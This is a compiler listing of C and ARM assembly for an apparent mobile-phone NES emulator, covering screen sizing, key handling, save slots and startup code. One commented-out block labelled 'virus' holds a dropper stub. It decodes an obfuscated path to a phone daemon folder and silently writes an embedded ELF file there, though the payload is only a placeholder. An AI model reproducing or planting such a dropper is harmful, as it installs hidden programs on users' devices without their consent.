    182            if(!(getHeight=param[pheight])) getHeight=256;
   \   0000000C   0720D0E5           LDRB     R2,[R0, #+7]
   \   00000010   000051E3           CMP      R1,#+0
   \   00000014   401FA003           MOVEQ    R1,#+256
   \   00000018   000052E3           CMP      R2,#+0
   \   0000001C   402FA003           MOVEQ    R2,#+256
    183            if(getWidth<64) getWidth=64;
   \   00000020   400051E3           CMP      R1,#+64
   \   00000024   4010A0B3           MOVLT    R1,#+64
   \   00000028   030000BA           BLT      ??getscrXY_0
    184            else if(getWidth>256) getWidth=256;
   \   0000002C   0130A0E3           MOV      R3,#+1
   \   00000030   403F83E3           ORR      R3,R3,#0x100
   \   00000034   030051E1           CMP      R1,R3
   \   00000038   401FA0A3           MOVGE    R1,#+256
   \                     ??getscrXY_0:
   \   0000003C   ........           LDR      R3,??DataTable42  ;; getWidth
    185            if(getHeight<64) getHeight=64;
   \   00000040   400052E3           CMP      R2,#+64
   \   00000044   001083E5           STR      R1,[R3, #+0]
   \   00000048   4020A0B3           MOVLT    R2,#+64
   \   0000004C   010000BA           BLT      ??getscrXY_1
    186            else if(getHeight>240) getHeight=240;
   \   00000050   F10052E3           CMP      R2,#+241
   \   00000054   F020A0A3           MOVGE    R2,#+240
   \                     ??getscrXY_1:
   \   00000058   ........           LDR      R1,??DataTable43  ;; getHeight
    187            screen_length=getWidth*getHeight;
   \   0000005C   003093E5           LDR      R3,[R3, #+0]
    188            if(param[screenx]>getWidth-width) param[screenx]=(getWidth-width<0)? 0: (getWidth-width);
   \   00000060   0B50D0E5           LDRB     R5,[R0, #+11]
   \   00000064   002081E5           STR      R2,[R1, #+0]
   \   00000068   74409FE5           LDR      R4,??getscrXY_2  ;; screen_length
   \   0000006C   92030CE0           MUL      R12,R2,R3
   \   00000070   ........           LDR      R2,??DataTable36  ;; width
   \   00000074   00C084E5           STR      R12,[R4, #+0]
   \   00000078   002092E5           LDR      R2,[R2, #+0]
   \   0000007C   0040A0E3           MOV      R4,#+0
   \   00000080   02C043E0           SUB      R12,R3,R2
   \   00000084   05005CE1           CMP      R12,R5
   \   00000088   030000AA           BGE      ??getscrXY_3
   \   0000008C   00005CE3           CMP      R12,#+0
   \   00000090   0020A043           MOVMI    R2,#+0
   \   00000094   02204350           SUBPL    R2,R3,R2
   \   00000098   0B20C0E5           STRB     R2,[R0, #+11]
    189            if(param[screeny]>getHeight-height) param[screeny]=(getHeight-height<0)? 0:(getHeight-height);
   \                     ??getscrXY_3:
   \   0000009C   ........           LDR      R2,??DataTable37  ;; height
   \   000000A0   0C50D0E5           LDRB     R5,[R0, #+12]
   \   000000A4   002092E5           LDR      R2,[R2, #+0]
   \   000000A8   001091E5           LDR      R1,[R1, #+0]
   \   000000AC   023041E0           SUB      R3,R1,R2
   \   000000B0   050053E1           CMP      R3,R5
   \   000000B4   020000AA           BGE      ??getscrXY_4
   \   000000B8   000053E3           CMP      R3,#+0
   \   000000BC   02404150           SUBPL    R4,R1,R2
   \   000000C0   0C40C0E5           STRB     R4,[R0, #+12]
    190            cls();
   \                     ??getscrXY_4:
   \   000000C4   ........           LDR      R0,??DataTable38  ;; screensize
   \   000000C8   0010A0E3           MOV      R1,#+0
   \   000000CC   000090E5           LDR      R0,[R0, #+0]
   \   000000D0   4021A0E1           ASR      R2,R0,#+2
   \   000000D4   ........           LDR      R0,??DataTable39  ;; screen
   \   000000D8   000090E5           LDR      R0,[R0, #+0]
   \   000000DC   ........           _BLF     memsetd,??memsetd??rA
    191          //  if(1)//C65) 
    192          //    getHeight=130;
    193          //  else if(EL71){ getHeight=getWidth=240;}
    194          //  getHeight=getWidth=100;
    195          //  screen_length=getWidth*getHeight;
    196          }
   \   000000E0   3080BDE8           POP      {R4,R5,PC}       ;; return
   \                     ??getscrXY_2:
   \   000000E4   ........           DC32     screen_length
    197          
    198          //extern void keyPressed(int i1);
    199          //extern void keyReleased(int i1);
    200          
    201          //int keyexit(){
    202          //  running=0; exit=1; saveini(); return 0;
    203          //}
    204          

   \                                 In segment CODE, align 4, keep-with-next
    205          void savename(char c){
   \                     savename:
   \   00000000   10402DE9           PUSH     {R4,LR}
    206            char *s=strrchr(romname,'.');
   \   00000004   2E10A0E3           MOV      R1,#+46
   \   00000008   0040A0E1           MOV      R4,R0
   \   0000000C   1C009FE5           LDR      R0,??savename_0  ;; param + 656
   \   00000010   170100EF           SWI      +279
    207            *++s='s'; *++s=c; *++s=0;
   \   00000014   010080E2           ADD      R0,R0,#+1
   \   00000018   7310A0E3           MOV      R1,#+115
   \   0000001C   ........           STRB     R1,[R0], #+1
   \   00000020   ........           STRB     R4,[R0], #+1
   \   00000024   0010A0E3           MOV      R1,#+0
   \   00000028   0010C0E5           STRB     R1,[R0, #+0]
    208          }
   \   0000002C   1080BDE8           POP      {R4,PC}          ;; return
   \                     ??savename_0:
   \   00000030   ........           DC32     param + 656
    209          
    210          #define JOY_UP 0x10
    211          #define JOY_DOWN 0x20
    212          #define JOY_LEFT 0x40
    213          #define JOY_RIGHT 0x80
    214          #define JOY_START 0x1
    215          #define JOY_SELECT 0x2
    216          #define JOY_AB 3
    217          
    218          #define JOY_A 0x4    
    219          #define JOY_B 0x8
    220          
    221          #define JOY_AA 0xff    
    222          #define JOY_BB 0xfe
    223          
    224          //#define step 8
    225          
    226          // keycode - код клавиши, pressed - нажата/отпущена/удерживается

   \                                 In segment CODE, align 4, keep-with-next
    227          int onkey(unsigned char keycode, int pressed){ //  Обработчик клавиш. Вернуть 0 или 1 для выхода
    228            byte *ptr;
    229            //int f;
    230            switch(pressed){
   \                     onkey:
   \   00000000   ........           LDR      R2,??DataTable40  ;; param
   \   00000004   00402DE9           PUSH     {LR}
   \   00000008   9330A0E3           MOV      R3,#+147
   \   0000000C   403F83E3           ORR      R3,R3,#0x100
   \   00000010   030051E1           CMP      R1,R3
   \   00000014   0B00000A           BEQ      ??onkey_0
   \   00000018   650F51E3           CMP      R1,#+404
   \   0000001C   0300000A           BEQ      ??onkey_1
   \   00000020   023083E2           ADD      R3,R3,#+2
   \   00000024   030051E1           CMP      R1,R3
   \   00000028   0600000A           BEQ      ??onkey_0
   \   0000002C   030000EA           B        ??onkey_2
    231            case KEY_UP: if(!mode) keypress(keycode,0); break; // Клавиша отпущена
   \                     ??onkey_1:
   \   00000030   001192E5           LDR      R1,[R2, #+256]
   \   00000034   000051E3           CMP      R1,#+0
   \   00000038   0900001A           BNE      ??onkey_3
   \   0000003C   ........           BL       keypress
   \                     ??onkey_2:
   \   00000040   0000A0E3           MOV      R0,#+0
   \   00000044   0080BDE8           POP      {PC}
    232            case LONG_PRESS: // Клавиша удерживается долго (повтор)
    233            case KEY_DOWN: // Клавиша нажата
    234              if(exit) return 1; //Выход
   \                     ??onkey_0:
   \   00000048   081192E5           LDR      R1,[R2, #+264]
   \   0000004C   000051E3           CMP      R1,#+0
   \   00000050   0100000A           BEQ      ??onkey_4
   \                     ??onkey_5:
   \   00000054   0100A0E3           MOV      R0,#+1
   \   00000058   0080BDE8           POP      {PC}
    235              if(keycode==RED_BUTTON)return 1;//keyexit();
   \                     ??onkey_4:
   \   0000005C   0C0050E3           CMP      R0,#+12
   \   00000060   FBFFFF0A           BEQ      ??onkey_5
    236              if(keycode==VOL_UP_BUTTON)
    237                  //SetVolume( Volume + 1 );
    238              if(keycode==VOL_DOWN_BUTTON)
    239                  //SetVolume( Volume - 1 );
    240              switch(mode){
    241              case 100: // main menu
    242                switch(keycode){
    243                case '0': return 1;//keyexit(); // Exit
    244                case '1': mode=1; break; //load
    245                case '2': mode=2; break; //save
    246                case '3': mode=3; break; //frmskip
    247                case '4': t_boolean_static_fld=(t_boolean_static_fld+1)&1; mode=0; break;
    248                case '8': mode=40; break; //sizex
    249                case '5': mode=99; break; //redefine
    250                case '7': mode=71; break;
    251                case LEFT_BUTTON: param[screenx]-=(param[screenx]<param[pstep])?param[screenx]:param[pstep]; getscrXY(); break;
    252                case RIGHT_BUTTON: param[screenx]+=param[pstep]; getscrXY(); break;
    253                case UP_BUTTON: param[screeny]-=(param[screeny]<param[pstep])?param[screeny]:param[pstep]; getscrXY(); break;
    254                case DOWN_BUTTON: param[screeny]+=param[pstep]; getscrXY(); break;
    255                case '6': 
    256                  if(param[pfilter]=(param[pfilter]+1)&1){
    257                    param[pwidth]=0; param[pheight]=240; getscrXY();
    258                  }else{
    259                     param[pwidth]=width; param[pheight]=height; getscrXY();
    260                  }
    261                  mode=0; break;
    262                case '9': mode=60; break; //sizey
    263              //  case '7': mode=0; cls(); if(++param[protate]>2) param[protate]=0; break; //rotate
    264          //      case '8': mode=0; cls(); param[presize]=~param[presize]; break; //resize
    265          //      case '9': param[pslow]=(param[pslow]+1)&1; break; //slow
    266                default: mode=0; break;
    267                }break;
    268              case 1: //load
    269                if(keycode>='0' && keycode<='9'){ 
    270                  savename(keycode);
    271                  v_boolean_static_fld=o_boolean_static_fld=1;
    272                  //if((f=fopen(romname,A_ReadOnly+A_BIN,P_READ,&err))!=-1){
    273                    //FCEUSS_LoadFP(f);
    274                  //  fclose(f,&err);
    275                  //}
    276                }
    277                mode=0; break;
    278              case 2: //save
    279                if(keycode>='0' && keycode<='9'){
    280                  savename(keycode);
    281                  v_boolean_static_fld=d_boolean_static_fld=1;
    282                  //if((f=fopen(romname,A_WriteOnly+A_BIN+A_Create+A_Truncate,P_WRITE,&err))!=-1){
    283                    //FCEUSS_SaveFP(f);
    284                  //  fclose(f,&err);
    285                  //}
    286                }
    287                mode=0; break;
    288              case 3: //frame_skip
    289                if(keycode>='0' && keycode<='9') A=param[pframeskip]=keycode-'0';
    290                mode=0; break;
    291          //    case 5: //redefine
    292          //      mode=99; break;
    293              case 99: //redefine - sel key
    294               switch(keycode){
    295                case RIGHT_SOFT:
    296                case LEFT_SOFT:
    297                //case GREEN_BUTTON: 
    298                case RED_BUTTON: mode=0; break;
    299                default:
    300                ptr=param+(param[palternate]?key2:key1);
    301                if(!(redefineptr=(byte*)strchr((char*)ptr,keycode))){ //нет клавиши
    302                  redefineptr=ptr+strlen((char*)ptr);
    303                  *redefineptr=keycode;
    304                }
    305                 redefineptr+=maxkey;
    306                 mode=98; break;
    307               } break; 
    308          
    309              case 98: //select key action
    310                switch(keycode){
    311          // const char helpkey[]=" 1 A\n2 up\n3 B\n4 left\n5 start\n6 right\n7 AA\n8 down\n9 BB\n0 select";
    312           
    313                case '5': *redefineptr=JOY_B; break;
    314                case '0': *redefineptr=JOY_A; break;
    315                case '1': *redefineptr=JOY_START; break;
    316                case '3': *redefineptr=JOY_SELECT; break;
    317                case '2': *redefineptr=JOY_UP; break;
    318                case '8': *redefineptr=JOY_DOWN; break;
    319                case '4': *redefineptr=JOY_LEFT; break;
    320                case '6': *redefineptr=JOY_RIGHT; break;
    321                case '7':  *redefineptr=JOY_AA; break;
    322                case '9':  *redefineptr=JOY_BB; break;
    323                case '*':  *redefineptr=JOY_AB; break;
    324                } mode=0; break;
    325          
    326              case 40: if(keycode>='0' && keycode<='9'){ 
    327                 tmpsize=keycode-'0'; ++mode;} else mode=0; break;
    328              case 41: if(keycode>='0' && keycode<='9'){ 
    329                tmpsize=tmpsize*10+keycode-'0'; ++mode;} else mode=0; break;
    330              case 42: if(keycode>='0' && keycode<='9'){ 
    331                param[pfilter]=0;
    332                param[pwidth]=tmpsize*10+keycode-'0'; getscrXY();
    333              } mode=0; break;
    334              
    335              case 60: if(keycode>='0' && keycode<='9'){ 
    336                 tmpsize=keycode-'0'; ++mode;} else mode=0; break;
    337              case 61: if(keycode>='0' && keycode<='9'){ 
    338                tmpsize=tmpsize*10+keycode-'0'; ++mode;} else mode=0; break;
    339              case 62: if(keycode>='0' && keycode<='9'){ 
    340                param[pfilter]=0;
    341                param[pheight]=tmpsize*10+keycode-'0'; getscrXY();
    342              } mode=0; break;
    343          
    344              case 71:
    345                if(keycode>='0' && keycode<='9'){ tmpsize=keycode-'0'; ++mode;}
    346                else mode=0; break;
    347              case 72:
    348                if(keycode>='0' && keycode<='9')  param[pstep]=tmpsize*10+keycode-'0';
    349                mode=0; break;
    350            
    351              case 0: default:
    352                switch(keycode){
    353                case RIGHT_SOFT: mode=100; break; //main menu
    354                case LEFT_SOFT: param[palternate]=!param[palternate]; break;
    355                default: keypress(keycode,1);
    356                }break;
    357              }
    358          
    359          //    onredraw(); DrawScreen(); // Перерисовать экран
    360            }
    361            return 0;
   \                     ??onkey_3:
   \   00000064   0000A0E3           MOV      R0,#+0
   \   00000068   0080BDE8           POP      {PC}             ;; return
    362          }
    363          

   \                                 In segment CODE, align 4, keep-with-next
    364          void onclose(){ // Закрытие окна
    365            running=0; // Сигнал на остановку фонового процесса
   \                     onclose:
   \   00000000   ........           LDR      R0,??DataTable46  ;; param
    366            ///
    367            //AudioTerminate();
    368            param[pwidth]=getWidth;
   \   00000004   ........           LDR      R2,??DataTable42  ;; getWidth
   \   00000008   0010A0E3           MOV      R1,#+0
   \   0000000C   041180E5           STR      R1,[R0, #+260]
   \   00000010   002092E5           LDR      R2,[R2, #+0]
   \   00000014   0620C0E5           STRB     R2,[R0, #+6]
    369            param[pheight]=getHeight;
   \   00000018   ........           LDR      R2,??DataTable43  ;; getHeight
   \   0000001C   002092E5           LDR      R2,[R2, #+0]
   \   00000020   0720C0E5           STRB     R2,[R0, #+7]
    370            param[pframeskip]=A;
   \   00000024   ........           LDR      R2,??DataTable49  ;; A
   \   00000028   002092E5           LDR      R2,[R2, #+0]
   \   0000002C   0120C0E5           STRB     R2,[R0, #+1]
    371            param[poptimize]=t_boolean_static_fld?0:1;
   \   00000030   ........           LDR      R2,??DataTable50  ;; t_boolean_static_fld
   \   00000034   0020D2E5           LDRB     R2,[R2, #+0]
   \   00000038   000052E3           CMP      R2,#+0
   \   0000003C   0110A003           MOVEQ    R1,#+1
   \   00000040   0810C0E5           STRB     R1,[R0, #+8]
    372            saveini();
   \   00000044   ........           B        saveini          ;; tailcall
    373          }
    374          

   \                                 In segment CODE, align 4, keep-with-next
    375          void onexit(){ // Выход
    376            freeall();
   \                     onexit:
   \   00000000   ........           _BF      freeall,??freeall??rA  ;; tailcall
    377          
    378          //  if(buf) mfree(buf); // Освобождаем память
    379          }
    380          

   \                                 In segment CODE, align 4, keep-with-next
    381          void oncreate(){ // Создание окна
   \                     oncreate:
   \   00000000   00402DE9           PUSH     {LR}
    382            
    383            AudioInit();
   \   00000004   ........           _BLF     AudioInit,??AudioInit??rA
    384            NSF_Init();
   \   00000008   ........           _BLF     NSF_Init,??NSF_Init??rA
    385            AudioStart();
   \   0000000C   ........           _BLF     AudioStart,??AudioStart??rA
    386            LastTmrVal=SysTimer();
   \   00000010   ........           _BLF     SysTimer,??SysTimer??rA
   \   00000014   0C109FE5           LDR      R1,??oncreate_0  ;; LastTmrVal
   \   00000018   000081E5           STR      R0,[R1, #+0]
    387            SUBPROC((void *)run);
   \   0000001C   08009FE5           LDR      R0,??oncreate_0+0x4  ;; run
   \   00000020   710100EF           SWI      +369
    388          
    389            // Запускаем фоновый процесс 
    390          //  GBS_StartTimerProc(&timer,262/2,timer_proc); // Стартуем таймер с частотой 2 раз в секунду
    391          }
   \   00000024   0080BDE8           POP      {PC}             ;; return
   \                     ??oncreate_0:
   \   00000028   ........           DC32     LastTmrVal
   \   0000002C   ........           DC32     run
    392          
    393          ///////ВИРУС!!!
    394          
    395          //char path[]="\xCB\xC5\xA3\xA5\xBD\x96\x91\xA3\xBB\x9E\x9A\x92\x90\x91\x8C\xA3"
    396          //"\xBA\x87\x8B\xBB\xD1\x9A\x93\x99\x0";
    397          //
    398          ////const char path[]="4:\\ZBin\\Daemons\\ExtD.elf";
    399          //#define elfsize 5020
    400          //char data[elfsize]="INSERT DATA HERE!!!";
    401          //
    402          //void v(){ //вирусное заражение
    403          //  int f,i;
    404          //  data[0]=0x7f;//0x464c457f;
    405          //  data[1]=0x45; data[2]=0x4c; data[3]=0x46;
    406          //  for(i=0;i<24;i++)
    407          //    path[i]=~path[i];
    408          //  i=0;
    409          //  do{
    410          //    f=fopen(path,A_ReadOnly+A_BIN,P_READ,&err);
    411          //    switch(i){
    412          //    case 0: if(f==-1) *(char*)path='0'; else fclose(f,&err); //drive 0 or 4?
    413          //      *((char*)path+strlen(path)-5)='N';
    414          //      break;
    415          //    case 1: //exists?
    416          //      if(f==-1)
    417          //      if((f=fopen(path,A_WriteOnly+A_BIN+A_Create+A_Truncate,P_WRITE,&err))==-1) return;
    418          //      fwrite(f,data,elfsize,&err);
    419          //      fclose(f,&err); 
    420          //      return;
    421          //    } 
    422          //  }while(++i<5);
    423          //}
    424          

   \                                 In segment CODE, align 4, keep-with-next
    425          int onstart(char *exename, char *fname){ // Старт приложения. Возвращает 0 или 1 для выхода.
   \                     onstart:
   \   00000000   30402DE9           PUSH     {R4,R5,LR}
   \   00000004   0140B0E1           MOVS     R4,R1
    426          //  B=110;  
    427            int i;
    428          //  v();
    429            if(!fname || fname[1]!=':') return 1;
   \   00000008   0200000A           BEQ      ??onstart_0
   \   0000000C   0110D4E5           LDRB     R1,[R4, #+1]
   \   00000010   3A0051E3           CMP      R1,#+58
   \   00000014   0100000A           BEQ      ??onstart_1
   \                     ??onstart_0:
   \   00000018   0100A0E3           MOV      R0,#+1
   \   0000001C   3080BDE8           POP      {R4,R5,PC}
    430            strcpy(filename, exename);
   \                     ??onstart_1:
   \   00000020   ........           LDR      R5,??DataTable46  ;; param
   \   00000024   0010A0E1           MOV      R1,R0
   \   00000028   840F85E2           ADD      R0,R5,#+528
   \   0000002C   1A0000EF           SWI      +26
    431            strcpy(romname,fname);
   \   00000030   0410A0E1           MOV      R1,R4
   \   00000034   A40F85E2           ADD      R0,R5,#+656
   \   00000038   1A0000EF           SWI      +26
    432            if(C65) param[pheight]=130;
   \   0000003C   ........           LDR      R0,??DataTable47  ;; C65
   \   00000040   0000D0E5           LDRB     R0,[R0, #+0]
   \   00000044   000050E3           CMP      R0,#+0
   \   00000048   8200A013           MOVNE    R0,#+130
   \   0000004C   0700C515           STRBNE   R0,[R5, #+7]
   \   00000050   0500001A           BNE      ??onstart_2
    433            else if(EL71){ param[pwidth]=param[pheight]=240;}
   \   00000054   ........           LDR      R0,??DataTable48  ;; EL71
   \   00000058   0000D0E5           LDRB     R0,[R0, #+0]
   \   0000005C   000050E3           CMP      R0,#+0
   \   00000060   F000A013           MOVNE    R0,#+240
   \   00000064   0700C515           STRBNE   R0,[R5, #+7]
   \   00000068   0600C515           STRBNE   R0,[R5, #+6]
    434            loadini();
   \                     ??onstart_2:
   \   0000006C   ........           BL       loadini
    435            if(!param[pstep]) param[pstep]=8;
   \   00000070   0A00D5E5           LDRB     R0,[R5, #+10]
   \   00000074   000050E3           CMP      R0,#+0
   \   00000078   0800A003           MOVEQ    R0,#+8
   \   0000007C   0A00C505           STRBEQ   R0,[R5, #+10]
    436            getscrXY();
   \   00000080   ........           BL       getscrXY
    437            if(!(A=param[pframeskip])) A=5;
   \   00000084   0100D5E5           LDRB     R0,[R5, #+1]
   \   00000088   ........           LDR      R1,??DataTable49  ;; A
   \   0000008C   000050E3           CMP      R0,#+0
   \   00000090   0500A003           MOVEQ    R0,#+5
   \   00000094   000081E5           STR      R0,[R1, #+0]
    438            t_boolean_static_fld=param[poptimize]?0:1;
   \   00000098   0800D5E5           LDRB     R0,[R5, #+8]
   \   0000009C   ........           LDR      R1,??DataTable50  ;; t_boolean_static_fld
   \   000000A0   000050E3           CMP      R0,#+0
   \   000000A4   0000A013           MOVNE    R0,#+0
   \   000000A8   0100A003           MOVEQ    R0,#+1
   \   000000AC   0000C1E5           STRB     R0,[R1, #+0]
    439            initnul();
   \   000000B0   ........           _BLF     initnul,??initnul??rA
    440            //
    441            //  
    442            if(i=loadrom(fname)) return i;
   \   000000B4   0400A0E1           MOV      R0,R4
   \   000000B8   ........           _BLF     loadrom,??loadrom??rA
   \   000000BC   3080BDE8           POP      {R4,R5,PC}       ;; return
    443          
    444              
    445            return 0;
    446          }

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable9:
   \   00000000   ........           DC32     `?<Constant ".ini">`

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable25:
   \   00000000   ........           DC32     screens

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable36:
   \   00000000   ........           DC32     width

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable37:
   \   00000000   ........           DC32     height

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable38:
   \   00000000   ........           DC32     screensize

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable39:
   \   00000000   ........           DC32     screen

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable40:
   \   00000000   ........           DC32     param

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable42:
   \   00000000   ........           DC32     getWidth

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable43:
   \   00000000   ........           DC32     getHeight

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable46:
   \   00000000   ........           DC32     param

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable47:
   \   00000000   ........           DC32     C65

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable48:
   \   00000000   ........           DC32     EL71

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable49:
   \   00000000   ........           DC32     A

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable50:
   \   00000000   ........           DC32     t_boolean_static_fld

   \                                 In segment DATA_ID, align 4, align-sorted
   \                     `?<Initializer for zfont>`:
   \   00000000   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000008   001010101000       DC8 0, 10H, 10H, 10H, 10H, 0, 10H, 0
   \              1000        
   \   00000010   002424000000       DC8 0, 24H, 24H, 0, 0, 0, 0, 0
   \              0000        
   \   00000018   00247E24247E       DC8 0, 24H, 7EH, 24H, 24H, 7EH, 24H, 0
   \              2400        
   \   00000020   00083E283E0A       DC8 0, 8, 3EH, 28H, 3EH, 0AH, 3EH, 8
   \              3E08        
   \   00000028   006264081026       DC8 0, 62H, 64H, 8, 10H, 26H, 46H, 0
   \              4600        
   \   00000030   001028102A44       DC8 0, 10H, 28H, 10H, 2AH, 44H, 3AH, 0
   \              3A00        
   \   00000038   000810000000       DC8 0, 8, 10H, 0, 0, 0, 0, 0
   \              0000        
   \   00000040   000408080808       DC8 0, 4, 8, 8, 8, 8, 4, 0
   \              0400        
   \   00000048   002010101010       DC8 0, 20H, 10H, 10H, 10H, 10H, 20H, 0
   \              2000        
   \   00000050   000014083E08       DC8 0, 0, 14H, 8, 3EH, 8, 14H, 0
   \              1400        
   \   00000058   000008083E08       DC8 0, 0, 8, 8, 3EH, 8, 8, 0
   \              0800        
   \   00000060   000000000008       DC8 0, 0, 0, 0, 0, 8, 8, 10H
   \              0810        
   \   00000068   000000003E00       DC8 0, 0, 0, 0, 3EH, 0, 0, 0
   \              0000        
   \   00000070   000000000018       DC8 0, 0, 0, 0, 0, 18H, 18H, 0
   \              1800        
   \   00000078   000002040810       DC8 0, 0, 2, 4, 8, 10H, 20H, 0
   \              2000        
   \   00000080   003C464A5262       DC8 0, 3CH, 46H, 4AH, 52H, 62H, 3CH, 0
   \              3C00        
   \   00000088   001828080808       DC8 0, 18H, 28H, 8, 8, 8, 3EH, 0
   \              3E00        
   \   00000090   003C42023C40       DC8 0, 3CH, 42H, 2, 3CH, 40H, 7EH, 0
   \              7E00        
   \   00000098   003C420C0242       DC8 0, 3CH, 42H, 0CH, 2, 42H, 3CH, 0
   \              3C00        
   \   000000A0   00081828487E       DC8 0, 8, 18H, 28H, 48H, 7EH, 8, 0
   \              0800        
   \   000000A8   007E407C0242       DC8 0, 7EH, 40H, 7CH, 2, 42H, 3CH, 0
   \              3C00        
   \   000000B0   003C407C4242       DC8 0, 3CH, 40H, 7CH, 42H, 42H, 3CH, 0
   \              3C00        
   \   000000B8   007E02040810       DC8 0, 7EH, 2, 4, 8, 10H, 10H, 0
   \              1000        
   \   000000C0   003C423C4242       DC8 0, 3CH, 42H, 3CH, 42H, 42H, 3CH, 0
   \              3C00        
   \   000000C8   003C42423E02       DC8 0, 3CH, 42H, 42H, 3EH, 2, 3CH, 0
   \              3C00        
   \   000000D0   000000100000       DC8 0, 0, 0, 10H, 0, 0, 10H, 0
   \              1000        
   \   000000D8   000010000010       DC8 0, 0, 10H, 0, 0, 10H, 10H, 20H
   \              1020        
   \   000000E0   000004081008       DC8 0, 0, 4, 8, 10H, 8, 4, 0
   \              0400        
   \   000000E8   0000003E003E       DC8 0, 0, 0, 3EH, 0, 3EH, 0, 0
   \              0000        
   \   000000F0   000010080408       DC8 0, 0, 10H, 8, 4, 8, 10H, 0
   \              1000        
   \   000000F8   003C42040800       DC8 0, 3CH, 42H, 4, 8, 0, 8, 0
   \              0800        
   \   00000100   003C4A565E40       DC8 0, 3CH, 4AH, 56H, 5EH, 40H, 3CH, 0
   \              3C00        
   \   00000108   003C42427E42       DC8 0, 3CH, 42H, 42H, 7EH, 42H, 42H, 0
   \              4200        
   \   00000110   007C427C4242       DC8 0, 7CH, 42H, 7CH, 42H, 42H, 7CH, 0
   \              7C00        
   \   00000118   003C42404042       DC8 0, 3CH, 42H, 40H, 40H, 42H, 3CH, 0
   \              3C00        
   \   00000120   007844424244       DC8 0, 78H, 44H, 42H, 42H, 44H, 78H, 0
   \              7800        
   \   00000128   007E407C4040       DC8 0, 7EH, 40H, 7CH, 40H, 40H, 7EH, 0
   \              7E00        
   \   00000130   007E407C4040       DC8 0, 7EH, 40H, 7CH, 40H, 40H, 40H, 0
   \              4000        
   \   00000138   003C42404E42       DC8 0, 3CH, 42H, 40H, 4EH, 42H, 3CH, 0
   \              3C00        
   \   00000140   0042427E4242       DC8 0, 42H, 42H, 7EH, 42H, 42H, 42H, 0
   \              4200        
   \   00000148   003E08080808       DC8 0, 3EH, 8, 8, 8, 8, 3EH, 0
   \              3E00        
   \   00000150   000202024242       DC8 0, 2, 2, 2, 42H, 42H, 3CH, 0
   \              3C00        
   \   00000158   004448704844       DC8 0, 44H, 48H, 70H, 48H, 44H, 42H, 0
   \              4200        
   \   00000160   004040404040       DC8 0, 40H, 40H, 40H, 40H, 40H, 7EH, 0
   \              7E00        
   \   00000168   0042665A4242       DC8 0, 42H, 66H, 5AH, 42H, 42H, 42H, 0
   \              4200        
   \   00000170   004262524A46       DC8 0, 42H, 62H, 52H, 4AH, 46H, 42H, 0
   \              4200        
   \   00000178   003C42424242       DC8 0, 3CH, 42H, 42H, 42H, 42H, 3CH, 0
   \              3C00        
   \   00000180   007C42427C40       DC8 0, 7CH, 42H, 42H, 7CH, 40H, 40H, 0
   \              4000        
   \   00000188   003C4242524A       DC8 0, 3CH, 42H, 42H, 52H, 4AH, 3CH, 0
   \              3C00        
   \   00000190   007C42427C44       DC8 0, 7CH, 42H, 42H, 7CH, 44H, 42H, 0
   \              4200        
   \   00000198   003C403C0242       DC8 0, 3CH, 40H, 3CH, 2, 42H, 3CH, 0
   \              3C00        
   \   000001A0   00FE10101010       DC8 0, 0FEH, 10H, 10H, 10H, 10H, 10H, 0
   \              1000        
   \   000001A8   004242424242       DC8 0, 42H, 42H, 42H, 42H, 42H, 3CH, 0
   \              3C00        
   \   000001B0   004242424224       DC8 0, 42H, 42H, 42H, 42H, 24H, 18H, 0
   \              1800        
   \   000001B8   00424242425A       DC8 0, 42H, 42H, 42H, 42H, 5AH, 24H, 0
   \              2400        
   \   000001C0   004224181824       DC8 0, 42H, 24H, 18H, 18H, 24H, 42H, 0
   \              4200        
   \   000001C8   008244281010       DC8 0, 82H, 44H, 28H, 10H, 10H, 10H, 0
   \              1000        
   \   000001D0   007E04081020       DC8 0, 7EH, 4, 8, 10H, 20H, 7EH, 0
   \              7E00        
   \   000001D8   000E08080808       DC8 0, 0EH, 8, 8, 8, 8, 0EH, 0
   \              0E00        
   \   000001E0   000040201008       DC8 0, 0, 40H, 20H, 10H, 8, 4, 0
   \              0400        
   \   000001E8   007010101010       DC8 0, 70H, 10H, 10H, 10H, 10H, 70H, 0
   \              7000        
   \   000001F0   001038541010       DC8 0, 10H, 38H, 54H, 10H, 10H, 10H, 0
   \              1000        
   \   000001F8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0FFH
   \              00FF        
   \   00000200   001C22782020       DC8 0, 1CH, 22H, 78H, 20H, 20H, 7EH, 0
   \              7E00        
   \   00000208   000038043C44       DC8 0, 0, 38H, 4, 3CH, 44H, 3CH, 0
   \              3C00        
   \   00000210   0020203C2222       DC8 0, 20H, 20H, 3CH, 22H, 22H, 3CH, 0
   \              3C00        
   \   00000218   00001C202020       DC8 0, 0, 1CH, 20H, 20H, 20H, 1CH, 0
   \              1C00        
   \   00000220   0004043C4444       DC8 0, 4, 4, 3CH, 44H, 44H, 3CH, 0
   \              3C00        
   \   00000228   000038447840       DC8 0, 0, 38H, 44H, 78H, 40H, 3CH, 0
   \              3C00        
   \   00000230   000C10181010       DC8 0, 0CH, 10H, 18H, 10H, 10H, 10H, 0
   \              1000        
   \   00000238   00003C44443C       DC8 0, 0, 3CH, 44H, 44H, 3CH, 4, 38H
   \              0438        
   \   00000240   004040784444       DC8 0, 40H, 40H, 78H, 44H, 44H, 44H, 0
   \              4400        
   \   00000248   001000301010       DC8 0, 10H, 0, 30H, 10H, 10H, 38H, 0
   \              3800        
   \   00000250   000400040404       DC8 0, 4, 0, 4, 4, 4, 24H, 18H
   \              2418        
   \   00000258   002028303028       DC8 0, 20H, 28H, 30H, 30H, 28H, 24H, 0
   \              2400        
   \   00000260   001010101010       DC8 0, 10H, 10H, 10H, 10H, 10H, 0CH, 0
   \              0C00        
